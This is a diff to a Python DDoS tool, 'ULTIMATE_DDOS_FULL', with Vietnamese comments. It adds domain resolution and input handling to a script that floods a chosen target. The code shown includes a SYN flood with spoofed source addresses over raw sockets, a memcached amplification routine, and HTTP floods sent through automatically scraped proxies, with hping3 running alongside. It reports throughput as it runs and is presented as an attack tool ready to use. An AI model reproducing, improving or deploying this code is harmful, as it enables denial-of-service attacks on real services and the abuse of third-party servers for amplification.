@@ -1,25 +1,24 @@
-import os
-import sys
-import time
-import random
-import socket
-import struct
-import threading
-import multiprocessing
-import subprocess
-import json
-import requests
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#   ULTIMATE_DDOS_FULL.py – Nhập IP hoặc Domain, tự động phân giải
+#   Tích hợp debug, proxy, đa tiến trình, hping3, raw socket
+#
+
+import os, sys, time, random, socket, struct, threading, multiprocessing
+import subprocess, requests
 from pathlib import Path
-from ctypes import CDLL, create_string_buffer, c_int, c_void_p, byref, cast, POINTER, Structure, c_uint32, c_uint16, c_uint8
+from ctypes import CDLL, c_int, c_void_p
 from ctypes.util import find_library
-from collections import defaultdict
 from concurrent.futures import ThreadPoolExecutor
 
+# ---------------------- CẤU HÌNH MẶC ĐỊNH ---------------------------
 CONFIG = {
+    "target_host": "",
     "target_ip": "",
     "target_port": 80,
     "threads_per_process": 200,
-    "num_processes": 0,          # 0 = tự động = CPU core
+    "num_processes": 0,
     "duration": 0,
     "use_proxy": True,
     "fallback_to_own_ip": True,
@@ -52,47 +51,71 @@ CONFIG = {
     "ssdp_multicast": "239.255.255.250"
 }
 
-packet_counter = multiprocessing.Value('Q', 0)  # 64-bit unsigned
+packet_counter = multiprocessing.Value('Q', 0)
 error_counter = multiprocessing.Value('Q', 0)
-proxy_list_shared = None  # sẽ được gán sau
+
+# ---------------------- HÀM NHẬP VÀ PHÂN GIẢI -----------------------
+def safe_input(prompt, default=None, required=False, cast_type=str):
+    while True:
+        try:
+            val = input(prompt)
+            if val.strip() == "" and default is not None:
+                return default
+            if required and val.strip() == "":
+                print("[!] Vui lòng nhập giá trị.")
+                continue
+            if cast_type == int:
+                return int(val)
+            return val
+        except ValueError:
+            print("[!] Sai định dạng, nhập lại.")
+        except KeyboardInterrupt:
+            print("\n[!] Thoát.")
+            sys.exit(0)
+
+def resolve_host(host):
+    try:
+        ip = socket.gethostbyname(host)
+        return ip
+    except:
+        return host
 
 def get_user_input():
     print("\n" + "="*60)
-    print("   ULTIMATE DDOS – Interactive Setup")
+    print("   ULTIMATE DDOS – Hỗ trợ IP hoặc Domain")
     print("="*60)
-    CONFIG["target_ip"] = input("Target IP (vd: 1.2.3.4): ").strip()
-    if not CONFIG["target_ip"]:
-        print("[!] IP không được bỏ trống.")
-        sys.exit(1)
-    CONFIG["target_port"] = int(input("Target Port (mặc định 80): ") or "80")
-    CONFIG["threads_per_process"] = int(input("Số luồng mỗi tiến trình (mặc định 200): ") or "200")
+    host = safe_input("Target (IP hoặc domain, vd: 1.2.3.4 hoặc example.com): ", required=True)
+    ip = resolve_host(host)
+    CONFIG["target_host"] = host
+    CONFIG["target_ip"] = ip
+    print(f"[*] Phân giải: {host} -> {ip}")
+    CONFIG["target_port"] = safe_input("Port (mặc dinh 80): ", default=80, cast_type=int)
+    CONFIG["threads_per_process"] = safe_input("Luồng mỗi tiến trình (mặc định 200): ", default=200, cast_type=int)
     cpu = os.cpu_count() or 4
-    CONFIG["num_processes"] = int(input(f"Số tiến trình (0 = tự động = {cpu}, mặc định 0): ") or "0")
+    CONFIG["num_processes"] = safe_input(f"Số tiến trình (0 = auto = {cpu}): ", default=0, cast_type=int)
     if CONFIG["num_processes"] == 0:
         CONFIG["num_processes"] = cpu
-    CONFIG["duration"] = int(input("Thời gian chạy (giây, 0 = vô hạn, mặc định 0): ") or "0")
-    CONFIG["use_proxy"] = input("Dùng proxy? (y/n, mặc định y): ").lower() != 'n'
-    CONFIG["fallback_to_own_ip"] = input("Fallback sang IP thật khi hết proxy? (y/n, mặc định y): ").lower() != 'n'
-    CONFIG["use_hping3"] = input("Dùng hping3 song song? (y/n, mặc định y): ").lower() != 'n'
+    CONFIG["duration"] = safe_input("Thời gian (giây, 0 = vô hạn): ", default=0, cast_type=int)
+    CONFIG["use_proxy"] = safe_input("Dùng proxy? (y/n, mặc định y): ", default='y').lower() != 'n'
+    CONFIG["fallback_to_own_ip"] = safe_input("Fallback IP thật? (y/n, mặc định y): ", default='y').lower() != 'n'
+    CONFIG["use_hping3"] = safe_input("Dùng hping3 song song? (y/n, mặc định y): ", default='y').lower() != 'n'
     print("="*60)
-    print("[*] Cấu hình đã nhận:")
+    print("[*] Cấu hình:")
     for k, v in CONFIG.items():
         if k not in ["proxy_sources","dns_servers","ntp_servers","memcached_servers"]:
             print(f"    {k}: {v}")
     print("="*60)
     return CONFIG
 
-# ---------------------- QUÉT PROXY (ĐA LUỒNG) -------------------------
+# ---------------------- QUÉT PROXY ----------------------------------
 def fetch_proxies_parallel():
-    from concurrent.futures import ThreadPoolExecutor, as_completed
     proxies = set()
     def get_from_url(url):
         try:
             r = requests.get(url, timeout=10)
             if r.status_code == 200:
-                lines = r.text.splitlines()
                 res = []
-                for line in lines:
+                for line in r.text.splitlines():
                     line = line.strip()
                     if line and ':' in line and not line.startswith('#'):
                         if '://' in line:
@@ -104,10 +127,12 @@ def fetch_proxies_parallel():
         return []
     with ThreadPoolExecutor(max_workers=10) as executor:
         futures = [executor.submit(get_from_url, url) for url in CONFIG["proxy_sources"]]
-        for f in as_completed(futures):
-            for p in f.result():
-                proxies.add(p)
-    # Lọc nhanh chất lượng (ping < 200ms)
+        for f in futures:
+            try:
+                for p in f.result():
+                    proxies.add(p)
+            except:
+                pass
     good = []
     for p in list(proxies)[:3000]:
         try:
@@ -125,6 +150,8 @@ def fetch_proxies_parallel():
         for p in good:
             f.write(p + "\n")
     return good
+
+# ---------------------- CTYPES --------------------------------------
 _libc = None
 try:
     _libc = CDLL(find_library("c"))
@@ -134,12 +161,9 @@ except:
     _libc = None
 
 def send_raw_fast(sock, packet, dest_ip, dest_port):
-    global packet_counter
     try:
         if _libc:
-            # Tạo sockaddr_in
             addr = struct.pack('=H4s', socket.AF_INET, socket.inet_aton(dest_ip))
-            # Gửi qua libc
             ret = _libc.sendto(sock.fileno(), packet, len(packet), 0, addr, len(addr))
         else:
             ret = sock.sendto(packet, (dest_ip, dest_port))
@@ -152,24 +176,19 @@ def send_raw_fast(sock, packet, dest_ip, dest_port):
             error_counter.value += 1
         return -1
 
-# (SYN, UDP, ICMP, DNS, NTP, Memcached, SSDP) với send_raw_fast
-
+# ---------------------- TẤN CÔNG RAW --------------------------------
 def syn_flood(target_ip, target_port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        # Tạo packet mẫu (tối giản)
         while True:
             src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
             sport = random.randint(1024,65535)
             seq = random.randint(0,2**32-1)
-            # Packet 40 bytes (IP+TCP) – tạo nhanh
-            pkt = b'\x45\x00\x00\x28' + struct.pack('!HH', random.randint(0,65535), 0)  # IP header cơ bản
-            pkt += struct.pack('!BBH', 255, 6, 0)  # TTL, protocol, checksum 0
+            pkt = b'\x45\x00\x00\x28' + struct.pack('!HH', random.randint(0,65535), 0)
+            pkt += struct.pack('!BBH', 255, 6, 0)
             pkt += socket.inet_aton(src) + socket.inet_aton(target_ip)
-            # TCP header
             pkt += struct.pack('!HHIIBBHHH', sport, target_port, seq, 0, 0x50, 0x02, 65535, 0, 0)
-            # Checksum bỏ qua cho nhanh (một số router không check)
             send_raw_fast(sock, pkt, target_ip, target_port)
     except:
         pass
@@ -209,7 +228,7 @@ def ntp_amp(target_ip):
 def memcached_amp(target_ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     q = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
-    servers = CONFIG["memcached_servers"] or ['1.2.3.4']  # thay bằng list thực
+    servers = CONFIG["memcached_servers"] or ['8.8.8.8']
     while True:
         s = random.choice(servers)
         send_raw_fast(sock, q, s, 11211)
@@ -239,35 +258,29 @@ def http_flood(proxy, target_ip, target_port):
                 requests.get(url, proxies=proxy_dict, headers=headers, timeout=CONFIG["proxy_timeout"])
                 requests.post(url, proxies=proxy_dict, headers=headers, data={'x':random.randint(1,9999)}, timeout=CONFIG["proxy_timeout"])
                 with packet_counter.get_lock():
-                    packet_counter.value += 2  # tính mỗi request là 1 gói
+                    packet_counter.value += 2
             except:
                 with error_counter.get_lock():
                     error_counter.value += 1
     except:
         pass
 
+# ---------------------- WORKER --------------------------------------
 def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_ref):
     fail_count = {}
     while True:
         proxy = None
-        if CONFIG["use_proxy"] and proxy_list_ref:
-            if len(proxy_list_ref) > 0:
-                proxy = random.choice(proxy_list_ref)
-                if proxy and fail_count.get(proxy, 0) >= CONFIG["max_proxy_fails"]:
-                    try:
-                        proxy_list_ref.remove(proxy)
-                    except:
-                        pass
-                    proxy = None
-        if proxy:
-            if mode == 'http':
-                http_flood(proxy, target_ip, target_port)
-            else:
-                # Các mode raw không dùng proxy, nhưng ta vẫn có thể dùng proxy để gửi? Không.
-                # Nếu mode raw mà có proxy, ta vẫn gửi trực tiếp (bỏ qua proxy)
-                pass
-        # Nếu không dùng proxy hoặc proxy fail, fallback
-        if not proxy or mode != 'http':
+        if CONFIG["use_proxy"] and proxy_list_ref and len(proxy_list_ref) > 0:
+            proxy = random.choice(proxy_list_ref)
+            if proxy and fail_count.get(proxy, 0) >= CONFIG["max_proxy_fails"]:
+                try:
+                    proxy_list_ref.remove(proxy)
+                except:
+                    pass
+                proxy = None
+        if proxy and mode == 'http':
+            http_flood(proxy, target_ip, target_port)
+        else:
             if CONFIG["fallback_to_own_ip"] or not CONFIG["use_proxy"]:
                 if mode == 'http':
                     try:
@@ -295,7 +308,6 @@ def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_
                 time.sleep(0.05)
 
 def process_worker(target_ip, target_port, process_id, total_threads, proxy_manager_list):
-    # proxy_manager_list là list được chia sẻ qua Manager
     proxy_list = proxy_manager_list
     modes = ['http'] * int(total_threads * CONFIG["http_ratio"])
     raw_modes = CONFIG["raw_modes"]
@@ -310,7 +322,7 @@ def process_worker(target_ip, target_port, process_id, total_threads, proxy_mana
     while True:
         time.sleep(10)
 
-# ---------------------- DEBUG LOOP (HIỂN THỊ THỐNG KÊ) ---------------
+# ---------------------- DEBUG ---------------------------------------
 def debug_loop(packet_counter, error_counter, proxy_list_ref):
     last_time = time.time()
     last_packets = 0
@@ -328,10 +340,9 @@ def debug_loop(packet_counter, error_counter, proxy_list_ref):
         proxy_count = len(proxy_list_ref) if proxy_list_ref else 0
         print(f"[DEBUG] {time.strftime('%H:%M:%S')} | Tổng gói: {pkt:,} | Lỗi: {err:,} | Tốc độ: {pps:,.0f} pps | Proxy: {proxy_count}")
 
+# ---------------------- MAIN -----------------------------------------
 def main():
-    # Nhập thông số
     get_user_input()
-    
     target_ip = CONFIG["target_ip"]
     target_port = CONFIG["target_port"]
     num_proc = CONFIG["num_processes"]
@@ -342,7 +353,6 @@ def main():
     print(f"\n[*] Khởi tạo với {num_proc} tiến trình, {total_threads} luồng.")
     print("[*] Đang quét proxy lần đầu...")
     
-    # Tạo Manager để chia sẻ proxy list
     manager = multiprocessing.Manager()
     proxy_list = manager.list()
     initial = fetch_proxies_parallel()
@@ -350,23 +360,17 @@ def main():
         proxy_list.append(p)
     print(f"[*] Đã có {len(proxy_list)} proxy chất lượng.")
     
-    # Lưu tham chiếu toàn cục để debug
-    global proxy_list_shared
-    proxy_list_shared = proxy_list
-    
-    # Hàm cập nhật proxy định kỳ (chạy ở tiến trình riêng)
     def proxy_updater(proxy_list):
         while True:
             time.sleep(CONFIG["proxy_scan_interval"])
-            new_proxies = fetch_proxies_parallel()
+            new = fetch_proxies_parallel()
             del proxy_list[:]
-            for p in new_proxies:
+            for p in new:
                 proxy_list.append(p)
             print(f"[*] Cập nhật proxy: {len(proxy_list)}")
     updater = multiprocessing.Process(target=proxy_updater, args=(proxy_list,), daemon=True)
     updater.start()
     
-    # Nếu dùng hping3, chạy song song
     if CONFIG["use_hping3"]:
         def hping3_worker():
             while True:
@@ -377,7 +381,6 @@ def main():
         hproc.start()
         print("[*] Đã kích hoạt hping3 song song.")
     
-    # Khởi động các tiến trình tấn công
     processes = []
     for i in range(num_proc):
         p = multiprocessing.Process(target=process_worker, args=(
@@ -387,11 +390,10 @@ def main():
         processes.append(p)
     print(f"[*] Đã khởi động {num_proc} tiến trình.")
     
-    # Chạy debug loop trong tiến trình chính
     debug_thread = threading.Thread(target=debug_loop, args=(packet_counter, error_counter, proxy_list), daemon=True)
     debug_thread.start()
     
-    print("[*] Tấn công đang chạy. Nhấn Ctrl+C để dừng.")
+    print("[*] Đang tấn công. Nhấn Ctrl+C để dừng.")
     try:
         if duration > 0:
             time.sleep(duration)
@@ -402,13 +404,11 @@ def main():
     except KeyboardInterrupt:
         print("[*] Người dùng dừng. Thoát.")
     finally:
-        # Dọn dẹp
         for p in processes:
             p.terminate()
         sys.exit(0)
 
 if __name__ == "__main__":
-    # Yêu cầu chạy với sudo nếu dùng raw socket
     if os.geteuid() != 0:
-        print("[!] Khuyến nghị chạy với sudo để có raw socket (SYN/UDP/ICMP).")
+        print("[!] Khuyến nghị chạy với sudo để dùng raw socket.")
     main()
